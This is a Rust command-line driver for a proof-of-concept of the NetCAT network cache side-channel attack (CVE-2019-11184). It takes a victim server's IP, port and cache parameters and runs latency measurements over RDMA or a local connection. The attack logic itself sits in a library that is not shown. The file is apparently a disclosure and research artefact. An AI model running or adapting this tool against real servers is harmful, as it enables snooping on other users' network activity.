use clap::{crate_authors, crate_version, App, Arg};
use std::net::IpAddr;
use std::str::FromStr;

const DEFAULT_PORT: &str = "9003";
const DEFAULT_MEASUREMENT_CNT: &str = "1000";
const DEFAULT_CACHE: &str = "E5_DDIO";

static CONN_TYPES: &[&str] = &["rdma", "local"];
static CACHES: &[&str] = &["E5_DDIO", "E5", "I7", "PLATINUM", "PLATINUM_DDIO", "custom"];

fn main() {
    let matches = app_cli_config().get_matches();

    if matches.is_present("interactive") {
        interactive::run_session();
    } else {
        uninteractive::run_session(matches);
    }
}

fn app_cli_config<'a, 'b>() -> App<'a, 'b> {
    App::new("NetCAT PoC")
        .version(crate_version!())
        .author(crate_authors!())
        .about("Implementation of the Network Cache Attack (CVE-2019-11184)")
        .arg_from_usage("[interactive] -i --interactive 'Sets the program into interactive mode. Ignores all other arguments'")
        .arg(
            Arg::with_name("connection")
                .long("conn")
                .short("c")
                .default_value("rdma")
                .value_name("CONNECTION_TYPE")
                .possible_values(CONN_TYPES)
                .help("Sets the connection type"),
        )
        .arg(
            Arg::with_name("address")
                .help("Victim server adress")
                .long("addr")
                .short("a")
                .takes_value(true)
                .value_name("IP_ADDR")
                .required(true)
                .default_value_if("interactive", None, "127.0.0.1")
                .validator(|x| match IpAddr::from_str(x.as_str()) {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("Faulty IP adress")),
                }),
        )
        .arg(
            Arg::with_name("port")
                .help("Victim server port to be used for control packets")
                .long("port")
                .short("p")
                .takes_value(true)
                .required_if("conneciton", "rdma")
                .value_name("PORT")
                .default_value(DEFAULT_PORT)
                .validator(|x| match x.parse::<u16>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("Faulty port")),
                }),
        )
        .arg(
            Arg::with_name("measurements")
                .help("The number of measurements to be taken")
                .long("measurements")
                .short("m")
                .takes_value(true)
                .default_value(DEFAULT_MEASUREMENT_CNT)
                .value_name("MESUREMENTS")
                .validator(|num_str| match num_str.parse::<usize>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("MEAUSEMENTS should be a number")),
                }),
        )
        .arg(
            Arg::with_name("cache_description")
                .help("Parameters, describing last level cache of the victim's machine")
                .long("cache_params")
                .short("d")
                .value_name("CACHE")
                .default_value(DEFAULT_CACHE)
                .possible_values(CACHES)
        )
        .arg(
            Arg::with_name("custom_cache")
                .help("Gives concrete parameters of the victim's LLC, if the predifined are not enough")
                .long("custom_params")
                .value_names(&["BYTES_PER_LINE", "ASSOCIATIVITY", "CACHE_SIZE_BYTES", "NUM_OF_ADDRS"])
                .required_if("cache_description", "custom")
                .validator(|s| match s.parse::<usize>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err("Invalind cache parameters: should be numbers".to_string())
                })
        )
        .arg_from_usage("[quite] -q --quite 'Does not disturb anyone by the output'")
        .arg_from_usage("[output] 'Output file to dump data to'")
}

mod uninteractive {
    use clap::{value_t, ArgMatches};
    use console::style;
    use netcat::connection::local::{LocalMemoryConnector, LocalPacketSender};
    use netcat::connection::rdma::{RdmaServerConnector, RemotePacketSender};
    use netcat::connection::{CacheConnector, PacketSender};
    use netcat::online_tracker::{LatsEntry, OnlineTracker, OnlineTrackerBuilder};
    use netcat::output::{file::JsonRecorder, Record};
    use netcat::rpp::params::CacheParams;
    use netcat::rpp::params::*;
    use netcat::rpp::Contents;
    use std::fs::File;
    use std::io::{stdout, BufWriter};
    use std::process::exit;

    pub fn run_session(args: ArgMatches) {
        let quite = args.is_present("quite");
        let port = value_t!(args.value_of("port"), u16).unwrap();
        let cnt = value_t!(args.value_of("measurements"), usize).unwrap();
        let output = args.value_of("output");

        let cache_type = args.value_of("cache_description").unwrap();

        let cparams = match cache_type {
            "E5" => XEON_E5,
            "E5_DDIO" => XEON_E5_DDIO,
            "I7" => CORE_I7,
            "PLATINUM" => XEON_PLATINUM,
            "PLATINUM_DDIO" => XEON_PLATINUM_DDIO,
            "custom" => {
                let mut vals = args.values_of("custom_cache").unwrap();
                let bytes_per_line = vals.next().unwrap().parse().unwrap();
                let lines_per_set = vals.next().unwrap().parse().unwrap();
                let cache_size = vals.next().unwrap().parse().unwrap();
                let num_addrs = vals.next().unwrap().parse().unwrap();
                CacheParams::new(bytes_per_line, lines_per_set, cache_size, num_addrs)
            }
            _ => panic!("Unsupported value"),
        };

        let ip = args.value_of("address").unwrap();

        // Unwraping is ok as we have a default value
        if args.value_of("connection").unwrap() == "rdma" {
            let sender = RemotePacketSender::new((ip, port)).unwrap_or_else(|e| {
                if !quite {
                    panic!("{}", style(e).red());
                }
                exit(1);
            });

            // these are required for rdma and validated
            let conn = RdmaServerConnector::new((ip, port)).unwrap_or_else(|e| {
                if !quite {
                    panic!("{}", style(e).red());
                }
                exit(1);
            });

            do_measurements(sender, conn, cnt, quite, cparams, output);
        } else {
            let sender = LocalPacketSender::new((ip, port)).unwrap_or_else(|e| {
                if !quite {
                    panic!("{}", style(e).red());
                }
                exit(1);
            });

            let conn = LocalMemoryConnector::new();

            do_measurements(sender, conn, cnt, quite, cparams, output);
        }
    }

    fn do_measurements<S, C>(
        sender: S,
        conn: C,
        cnt: usize,
        quite: bool,
        cparams: CacheParams,
        output: Option<&str>,
    ) where
        S: PacketSender,
        C: CacheConnector<Item = Contents>,
    {
        if let Some(file_name) = output {
            // The user provided output location
            let file = File::create(file_name).unwrap_or_else(|e| {
                if !quite {
                    panic!("Error while opening file: {}", style(e).red());
                }
                exit(1)
            });

            let output = JsonRecorder::new(BufWriter::new(file));
            let tracker = OnlineTrackerBuilder::new()
                .set_conn(conn)
                .set_sender(sender)
                .set_quite(quite)
                .set_cache(cparams)
                .set_output(output)
                .finalize()
                .unwrap_or_else(|e| {
                    if !quite {
                        panic!("{}", style(e).red());
                    }
                    exit(1);
                });

            run_tracker(tracker, cnt, quite);
        } else {
            // The user did not provide output, printing to stdout
            let output = JsonRecorder::new(BufWriter::new(stdout()));

            let tracker = OnlineTrackerBuilder::new()
                .set_conn(conn)
                .set_sender(sender)
                .set_quite(quite)
                .set_cache(cparams)
                .set_output(output)
                .finalize()
                .unwrap_or_else(|e| {
                    if !quite {
                        panic!("{}", style(e).red());
                    }
                    exit(1);
                });

            run_tracker(tracker, cnt, quite);
        }
    }

    fn run_tracker<C, R, S>(mut tracker: OnlineTracker<C, R, S>, cnt: usize, quite: bool)
    where
        C: CacheConnector<Item = Contents>,
        R: Record<LatsEntry>,
        S: PacketSender,
    {
        if let Err(e) = tracker.init() {
            if !quite {
                eprintln!("Online Tracker: {}", style(e).red());
            }
        }
        if let Err(e) = tracker.track(cnt) {
            if !quite {
                eprintln!("Online Tracker: {}", style(e).red());
            }
        }
    }
}

mod interactive {
    use console::style;
    use dialoguer::{theme::ColorfulTheme, Confirmation, Input, Select};
    use netcat::connection::local::{LocalMemoryConnector, LocalPacketSender};
    use netcat::connection::rdma::{RdmaServerConnector, RemotePacketSender};
    use netcat::connection::{CacheConnector, PacketSender};
    use netcat::online_tracker::{LatsEntry, OnlineTracker, OnlineTrackerBuilder};
    use netcat::output::{file::JsonRecorder, Record};
    use netcat::rpp::{params::*, Contents};
    use std::fs::File;
    use std::io::{stdout, BufWriter};
    use std::net::{IpAddr, SocketAddr};
    use std::str::FromStr;

    pub fn run_session() {
        let conn_selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Choose connection type")
            .default(0)
            .items(super::CONN_TYPES)
            .interact()
            .unwrap();

        let sock_addr = get_addr();

        if super::CONN_TYPES[conn_selection] == "rdma" {
            let sender =
                RemotePacketSender::new(sock_addr).unwrap_or_else(|e| panic!("{}", style(e).red()));

            let conn = match RdmaServerConnector::new(sock_addr) {
                Ok(c) => c,
                Err(e) => panic!("{}", style(e).red()),
            };
            do_measurements(sender, conn);
        } else {
            let sender =
                LocalPacketSender::new(sock_addr).unwrap_or_else(|e| panic!("{}", style(e).red()));

            let conn = LocalMemoryConnector::new();
            do_measurements(sender, conn);
        }
    }
    fn get_ip() -> IpAddr {
        Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Enter IP of the server (should be broadcast for local attack)")
            .validate_with(|x: &str| match IpAddr::from_str(x) {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Faulty IP adress")),
            })
            .interact()
            .unwrap()
    }

    fn get_port() -> u16 {
        Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Enter port to send to")
            .default(super::DEFAULT_PORT.parse().unwrap())
            .show_default(true)
            .validate_with(|x: &str| match x.parse::<u16>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Faulty port")),
            })
            .interact()
            .unwrap()
    }

    fn get_addr() -> SocketAddr {
        (get_ip(), get_port()).into()
    }

    fn get_custom_cache() -> CacheParams {
        let bytes_per_line: usize = Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Enter number of bytes per cache line")
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Must be a number")),
            })
            .interact()
            .unwrap();

        let lines_per_set: usize = Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Associativity of the cache")
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Must be a number")),
            })
            .interact()
            .unwrap();

        let cache_size: usize = Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Size of the cache in bytes")
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Must be a number")),
            })
            .interact()
            .unwrap();

        let addr_num = Input::with_theme(&ColorfulTheme::default())
            .with_prompt("How many addresses needed to create eviction sets")
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Must be a number")),
            })
            .interact()
            .unwrap();

        CacheParams::new(bytes_per_line, lines_per_set, cache_size, addr_num)
    }

    fn do_measurements<S, C>(sender: S, conn: C)
    where
        S: PacketSender,
        C: CacheConnector<Item = Contents>,
    {
        let cache_type = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Choose cache")
            .default(0)
            .items(super::CACHES)
            .interact()
            .unwrap();

        let cparams = match super::CACHES[cache_type] {
            "E5_DDIO" => XEON_E5_DDIO,
            "E5" => XEON_E5,
            "I7" => CORE_I7,
            "PLATINUM" => XEON_PLATINUM,
            "PLATINUM_DDIO" => XEON_PLATINUM_DDIO,
            "custom" => get_custom_cache(),
            _ => panic!("Unsupported cache"),
        };

        let file_name = get_filename();
        if file_name.is_empty() {
            eprintln!(
                "No filename provided, printing to {}",
                style("stdout").green()
            );
            let output = JsonRecorder::new(BufWriter::new(stdout()));

            let tracker = OnlineTrackerBuilder::new()
                .set_conn(conn)
                .set_sender(sender)
                .set_cache(cparams)
                .set_quite(false)
                .set_output(output)
                .finalize()
                .unwrap_or_else(|e| panic!("{}", style(e).red()));

            run_tracker(tracker);
        } else {
            let file = open_until_can(file_name);

            let output = JsonRecorder::new(BufWriter::new(file));

            let tracker = OnlineTrackerBuilder::new()
                .set_conn(conn)
                .set_sender(sender)
                .set_cache(cparams)
                .set_quite(false)
                .set_output(output)
                .finalize()
                .unwrap_or_else(|e| panic!("{}", style(e).red()));

            run_tracker(tracker);
        }
    }

    fn get_filename() -> String {
        Input::with_theme(&ColorfulTheme::default())
            .with_prompt("File to save results to [stdout]")
            .default(String::new())
            .show_default(false)
            .interact()
            .unwrap()
    }

    fn open_until_can(file_name: String) -> File {
        let mut file_name = file_name;

        loop {
            match File::create(file_name) {
                Ok(file) => return file,
                Err(e) => {
                    eprintln!("Error while opening the file: {}", style(e).red());
                }
            }
            file_name = get_filename();
        }
    }

    fn run_tracker<C, R, S>(mut tracker: OnlineTracker<C, R, S>)
    where
        C: CacheConnector<Item = Contents>,
        R: Record<LatsEntry>,
        S: PacketSender,
    {
        let mut not_init = true;
        while not_init {
            if let Err(e) = tracker.init() {
                eprintln!("Online Tracker: {}", style(e).red());
                not_init = should_continue();
            } else {
                not_init = false;
            }
        }

        let mut not_done = true;
        while not_done {
            let cnt = get_cnt();
            if let Err(e) = tracker.track(cnt) {
                eprintln!("Online Tracker: {}", style(e).red());
            }

            not_done = should_continue();
        }
    }

    fn get_cnt() -> usize {
        Input::with_theme(&ColorfulTheme::default())
            .with_prompt("Enter number of measurements")
            .default(super::DEFAULT_MEASUREMENT_CNT.parse().unwrap())
            .show_default(true)
            .validate_with(|x: &str| match x.parse::<usize>() {
                Ok(_) => Ok(()),
                Err(_) => Err(String::from("Faulty port")),
            })
            .interact()
            .unwrap()
    }

    fn should_continue() -> bool {
        Confirmation::new()
            .with_text("Do you want to continue?")
            .default(true)
            .show_default(true)
            .interact()
            .unwrap()
    }
}
